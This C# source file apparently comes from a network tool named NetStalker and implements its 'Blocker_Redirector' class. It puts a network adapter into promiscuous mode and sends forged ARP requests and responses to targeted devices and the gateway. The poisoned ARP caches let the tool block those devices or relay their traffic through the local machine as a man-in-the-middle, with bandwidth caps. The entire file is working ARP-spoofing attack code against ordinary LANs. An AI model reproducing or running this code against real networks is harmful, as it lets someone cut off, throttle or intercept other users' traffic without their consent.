﻿using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading.Tasks;

namespace NetStalker.MainLogic
{
    public class Blocker_Redirector
    {
        /// <summary>
        /// Main capture device.
        /// </summary>
        public static ICaptureDevice MainDevice;

        /// <summary>
        /// Blocker-Redirector task.
        /// </summary>
        public static Task BRTask;

        /// <summary>
        /// Main activation switch.
        /// </summary>
        public static bool BRMainSwitch = false;

        /// <summary>
        /// This is the main method for blocking and redirection of targeted devices.
        /// </summary>
        public static void BlockAndRedirect()
        {
            if (!BRMainSwitch)
                throw new InvalidOperationException("\"BRMainSwitch\" must be set to \"True\" in order to activate the BR");

            if (string.IsNullOrEmpty(Properties.Settings.Default.GatewayMac))
            {
                Properties.Settings.Default.GatewayMac = Main.Devices.Where(d => d.Key.Equals(AppConfiguration.GatewayIp)).Select(d => d.Value.MAC).FirstOrDefault().ToString();
                Properties.Settings.Default.Save();
            }

            if (MainDevice == null)
                MainDevice = CaptureDeviceList.New()[AppConfiguration.AdapterName];

            MainDevice.Open(DeviceMode.Promiscuous, 1000);
            MainDevice.Filter = "ip";

            BRTask = Task.Run(() =>
            {
                RawCapture rawCapture;
                EthernetPacket packet;

                while (BRMainSwitch)
                {
                    if ((rawCapture = MainDevice.GetNextPacket()) != null)
                    {
                        packet = Packet.ParsePacket(rawCapture.LinkLayerType, rawCapture.Data) as EthernetPacket;
                        if (packet == null)
                            continue;

                        KeyValuePair<IPAddress, Device> device;

                        if (!(device = Main.Devices.FirstOrDefault(D => D.Value.MAC.Equals(packet.SourceHardwareAddress))).Equals(default(KeyValuePair<IPAddress, Device>)) && device.Value.Redirected)
                        {
                            if (device.Value.UploadCap == 0 || device.Value.UploadCap > device.Value.PacketsSentSinceLastReset)
                            {
                                packet.SourceHardwareAddress = MainDevice.MacAddress;
                                packet.DestinationHardwareAddress = AppConfiguration.GatewayMac;
                                MainDevice.SendPacket(packet);
                                device.Value.PacketsSentSinceLastReset += packet.Bytes.Length;
                            }
                        }
                        else if (packet.SourceHardwareAddress.Equals(AppConfiguration.GatewayMac))
                        {
                            IPv4Packet IPV4 = packet.Extract<IPv4Packet>();

                            if (!(device = Main.Devices.FirstOrDefault(D => D.Key.Equals(IPV4.DestinationAddress))).Equals(default(KeyValuePair<IPAddress, Device>)) && device.Value.Redirected)
                            {
                                if (device.Value.DownloadCap == 0 || device.Value.DownloadCap > device.Value.PacketsReceivedSinceLastReset)
                                {
                                    packet.SourceHardwareAddress = MainDevice.MacAddress;
                                    packet.DestinationHardwareAddress = device.Value.MAC;
                                    MainDevice.SendPacket(packet);
                                    device.Value.PacketsReceivedSinceLastReset += packet.Bytes.Length;
                                }
                            }
                        }
                    }

                    SpoofClients();
                }
            });
        }

        /// <summary>
        /// Loop around the list of targeted devices and spoof them.
        /// </summary>
        public static void SpoofClients()
        {
            foreach (var item in Main.Devices)
            {
                if (item.Value.Blocked)
                {
                    ConstructAndSendArp(item.Value, BROperation.Spoof);
                    if (AppConfiguration.SpoofProtection)
                        ConstructAndSendArp(item.Value, BROperation.Protection);
                }
            }
        }

        /// <summary>
        /// Build an Arp packet for the selected device based on the operation type and send it.
        /// </summary>
        /// <param name="device">The targeted device</param>
        /// <param name="Operation">Operation type</param>
        public static void ConstructAndSendArp(Device device, BROperation Operation)
        {
            if (Operation == BROperation.Spoof)
            {
                ArpPacket ArpPacketForVicSpoof = new ArpPacket(ArpOperation.Request, device.MAC, device.IP, MainDevice.MacAddress, AppConfiguration.GatewayIp);
                ArpPacket ArpPacketForGatewaySpoof = new ArpPacket(ArpOperation.Request, AppConfiguration.GatewayMac, AppConfiguration.GatewayIp, MainDevice.MacAddress, device.IP);
                EthernetPacket EtherPacketForVicSpoof = new EthernetPacket(MainDevice.MacAddress, device.MAC, EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForVicSpoof
                };
                EthernetPacket EtherPacketForGatewaySpoof = new EthernetPacket(MainDevice.MacAddress, AppConfiguration.GatewayMac, EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForGatewaySpoof
                };

                MainDevice.SendPacket(EtherPacketForVicSpoof);
                if (device.Redirected)
                    MainDevice.SendPacket(EtherPacketForGatewaySpoof);

            }
            else
            {
                ArpPacket ArpPacketForVicProtection = new ArpPacket(ArpOperation.Response, MainDevice.MacAddress, AppConfiguration.LocalIp, device.MAC, device.IP);
                ArpPacket ArpPacketForGatewayProtection = new ArpPacket(ArpOperation.Response, MainDevice.MacAddress, AppConfiguration.LocalIp, AppConfiguration.GatewayMac, AppConfiguration.GatewayIp);
                EthernetPacket EtherPacketForVicProtection = new EthernetPacket(device.MAC, MainDevice.MacAddress, EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForVicProtection
                };
                EthernetPacket EtherPacketForGatewayProtection = new EthernetPacket(AppConfiguration.GatewayMac, MainDevice.MacAddress, EthernetType.Arp)
                {
                    PayloadPacket = ArpPacketForGatewayProtection
                };

                MainDevice.SendPacket(EtherPacketForGatewayProtection);
                MainDevice.SendPacket(EtherPacketForVicProtection);
            }
        }
    }
}
